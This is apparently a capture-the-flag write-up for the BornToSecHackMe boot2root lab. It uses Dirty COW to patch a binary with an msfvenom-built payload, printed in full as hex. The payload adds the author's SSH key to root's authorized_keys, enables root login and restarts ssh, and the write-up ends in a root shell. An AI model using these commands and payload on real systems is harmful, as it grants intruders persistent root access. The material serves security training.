# dirtyc0w - adding an authorized ssh key to root

For this exploit, we will be using the `exploit_me` binary to execute a command with root privileges, adding an authorized ssh key to the root user. This will allow us to log in as the root user using our ssh key.
To modify the `exploit_me` binary, we will use the `dirtyc0w` exploit.

First, let's create a ssh key pair.

```
nlederge@k0r4p14:~ $ ssh-keygen            
Generating public/private rsa key pair.
Enter file in which to save the key (/home/nlederge/.ssh/id_rsa): /home/nlederge/.ssh/id_rsa_b2r
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/nlederge/.ssh/id_rsa_b2r
Your public key has been saved in /home/nlederge/.ssh/id_rsa_b2r.pub
The key fingerprint is:
SHA256:xzkGeqEBYyYtCUWsAB1W2ebg2FhoB6NMyE7hIJFf2To nlederge@k0r4p14.42mulhouse.fr
The key's randomart image is:
+---[RSA 3072]----+
|X@XB*=           |
|X=B=Oo+          |
|=* X =. o        |
|..+ E .+ + .     |
|     .o S *      |
|       . o .     |
|                 |
|                 |
|                 |
+----[SHA256]-----+
nlederge@k0r4p14:~ $ cat .ssh/id_rsa_b2r.pub                                                                      
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6KXlE7JaliyPcyph/g9OxidUv5NI/65XdyxalFY3vyssF/bbRjH67fRH3khb1qHNs9v1/TCmmX3G0xo+hEmP5ZjQL/ogAGf6ORnGwVJx6NnqbIBqSNxsB8Ft7bskQtrifPZu4vmMNmmPrDix+yjjPyagXqJt1gDZeJ2Dp7JwW/HEiT8XPpsYeLKdHlIzUpQ0LQfVFW7fvWx4WTEMU17BOCHW+NO+3vQAubvMHpZ0+ndIWLnqzls12iTtEq0MIp9w5nKvyjk5gaCzjdLT4k8s1ruF2AF+wBljCOk4f4Oare972fBPVFNAayM4ksUzqeqFX0tGZTtk1JT2B0GcC7m4Id28hgu/XBI4qc6VhOdm7UiVIz9hVhs7U3fZ8DQOEToTvDG9K3bjxy0rKBkX+bHj1+7EWivPSUGsMyBOAb3FSWgYDzxwGIs6KW+4n710sHEsl8qi8c1Z6vrqi198BjZK0Ki+t+giWRPH29uZyN/rcGjboaj+rpwRLMdQcvDl8+Es= nlederge@k0r4p14.42mulhouse.fr
```

Let's copy the public key to `/tmp/id_rsa_b2r.pub` in the target machine.

```
nlederge@k0r4p14:~ $ scp ~/.ssh/id_rsa_b2r.pub zaz@10.11.250.221:/tmp/id_rsa_b2r.pub
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@10.11.250.221's password: 
id_rsa_b2r.pub                                                                                100%  584     1.8MB/s   00:00
```

Now let's craft a payload with `msfvenom` to add our ssh key to the root user, sets the proper permissions,permit the root login, allow the root user to login and restart the ssh service.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -platform Linux -p linux/x86/exec CMD="mkdir -p /root/.ssh/ && cat /tmp/id_rsa_b2r.pub >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && chown -R root:root /root/.ssh && sed -i 's/^PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config && sed -i 's/^AllowUsers/#AllowUsers/' /etc/ssh/sshd_config && service ssh restart" PrependSetuid=true -f elf -a x86 -o payload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 376 bytes
Final size of elf file: 460 bytes
Saved as: payload
                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ xxd -i payload
unsigned char payload[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xcc, 0x01, 0x00, 0x00,
  0x44, 0x03, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x4e, 0x01, 0x00, 0x00,
  0x6d, 0x6b, 0x64, 0x69, 0x72, 0x20, 0x2d, 0x70, 0x20, 0x2f, 0x72, 0x6f,
  0x6f, 0x74, 0x2f, 0x2e, 0x73, 0x73, 0x68, 0x2f, 0x20, 0x26, 0x26, 0x20,
  0x63, 0x61, 0x74, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x69, 0x64, 0x5f,
  0x72, 0x73, 0x61, 0x5f, 0x62, 0x32, 0x72, 0x2e, 0x70, 0x75, 0x62, 0x20,
  0x3e, 0x3e, 0x20, 0x2f, 0x72, 0x6f, 0x6f, 0x74, 0x2f, 0x2e, 0x73, 0x73,
  0x68, 0x2f, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x7a, 0x65, 0x64,
  0x5f, 0x6b, 0x65, 0x79, 0x73, 0x20, 0x26, 0x26, 0x20, 0x63, 0x68, 0x6d,
  0x6f, 0x64, 0x20, 0x37, 0x30, 0x30, 0x20, 0x2f, 0x72, 0x6f, 0x6f, 0x74,
  0x2f, 0x2e, 0x73, 0x73, 0x68, 0x20, 0x26, 0x26, 0x20, 0x63, 0x68, 0x6d,
  0x6f, 0x64, 0x20, 0x36, 0x30, 0x30, 0x20, 0x2f, 0x72, 0x6f, 0x6f, 0x74,
  0x2f, 0x2e, 0x73, 0x73, 0x68, 0x2f, 0x61, 0x75, 0x74, 0x68, 0x6f, 0x72,
  0x69, 0x7a, 0x65, 0x64, 0x5f, 0x6b, 0x65, 0x79, 0x73, 0x20, 0x26, 0x26,
  0x20, 0x63, 0x68, 0x6f, 0x77, 0x6e, 0x20, 0x2d, 0x52, 0x20, 0x72, 0x6f,
  0x6f, 0x74, 0x3a, 0x72, 0x6f, 0x6f, 0x74, 0x20, 0x2f, 0x72, 0x6f, 0x6f,
  0x74, 0x2f, 0x2e, 0x73, 0x73, 0x68, 0x20, 0x26, 0x26, 0x20, 0x73, 0x65,
  0x64, 0x20, 0x2d, 0x69, 0x20, 0x27, 0x73, 0x2f, 0x5e, 0x50, 0x65, 0x72,
  0x6d, 0x69, 0x74, 0x52, 0x6f, 0x6f, 0x74, 0x4c, 0x6f, 0x67, 0x69, 0x6e,
  0x20, 0x6e, 0x6f, 0x2f, 0x50, 0x65, 0x72, 0x6d, 0x69, 0x74, 0x52, 0x6f,
  0x6f, 0x74, 0x4c, 0x6f, 0x67, 0x69, 0x6e, 0x20, 0x79, 0x65, 0x73, 0x2f,
  0x27, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x73, 0x68, 0x2f, 0x73,
  0x73, 0x68, 0x64, 0x5f, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x20, 0x26,
  0x26, 0x20, 0x73, 0x65, 0x64, 0x20, 0x2d, 0x69, 0x20, 0x27, 0x73, 0x2f,
  0x5e, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x55, 0x73, 0x65, 0x72, 0x73, 0x2f,
  0x23, 0x41, 0x6c, 0x6c, 0x6f, 0x77, 0x55, 0x73, 0x65, 0x72, 0x73, 0x2f,
  0x27, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x73, 0x68, 0x2f, 0x73,
  0x73, 0x68, 0x64, 0x5f, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x20, 0x26,
  0x26, 0x20, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x20, 0x73, 0x73,
  0x68, 0x20, 0x72, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int payload_len = 460;
```

We use this payload in `scripts/dirtyc0w_ssh.c`, we `scp ./scripts/dirtyc0w_ssh.c zaz@10.11.250.221:/tmp/dirtyc0w_ssh.c`, compile it with `gcc -pthread dirtyc0w_ssh.c -o dirtyc0w_ssh -lcrypt` and run it as well as the `exploit_me` binary.

```
zaz@BornToSecHackMe:/tmp$ ./dirtyc0w_ssh 
/home/zaz/exploit_me successfully backed up to /home/zaz/exploit_me.bak
mmap: b7fd9000
madvise 0

ptrace 0
Done! Check /home/zaz/exploit_me to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /home/zaz/exploit_me.bak /home/zaz/exploit_me
Done! Check /home/zaz/exploit_me to see if it was modified.

DON'T FORGET TO RESTORE! $ mv /home/zaz/exploit_me.bak /home/zaz/exploit_me
zaz@BornToSecHackMe:/tmp$ ./dirtyc0w_ssh
zaz@BornToSecHackMe:/tmp$ cd
zaz@BornToSecHackMe:~$ ./exploit_me 
ssh stop/waiting
ssh start/running, process 2006
```

Since the versions of ssh differ between the target machine and ours, we need to accept the deprecated `ssh-rsa` algorithm explicitly when logging in.

```
nlederge@k0r4p14:42adv_boot2root/bonus ‹main*›$ ssh -i ~/.ssh/id_rsa_b2r -o PubkeyAcceptedAlgorithms=+ssh-rsa root@10.11.250.221
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

You have mail.
root@BornToSecHackMe:~# cat README 
CONGRATULATIONS !!!!
To be continued...
root@BornToSecHackMe:~# id
uid=0(root) gid=0(root) groups=0(root)
root@BornToSecHackMe:~# whoami
root
```


